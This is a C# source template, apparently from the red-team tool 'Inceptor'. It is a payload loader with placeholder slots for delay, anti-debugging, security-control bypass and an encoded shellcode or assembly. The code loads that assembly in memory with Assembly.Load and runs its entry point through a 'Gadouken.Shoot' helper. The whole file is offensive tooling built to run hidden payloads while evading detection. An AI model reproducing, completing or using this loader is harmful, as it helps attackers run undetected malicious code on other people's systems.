using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
//####USING####

namespace Inceptor
{

    class Program
    {
        static void Main(string[] args)
        {
            //####DELAY####

            //####ANTIDEBUG####

            //####BYPASS####

            var encoded = ####SHELLCODE####;

            //####CALL####

            Assembly assembly = Assembly.Load(decoded);

            Gadouken.Shoot(assembly, args);
        }
    }

    public static class Gadouken
    {

        public static void Shoot(Assembly assembly, Object[] args = null)
        {

            if (args == null)
            {
                args = new Object[] { Environment.GetCommandLineArgs() };
            }else{
                args = new Object[] { args };
            }

            assembly.EntryPoint.Invoke(null, args);

            return;
        }
    }

    //####CODE####

}
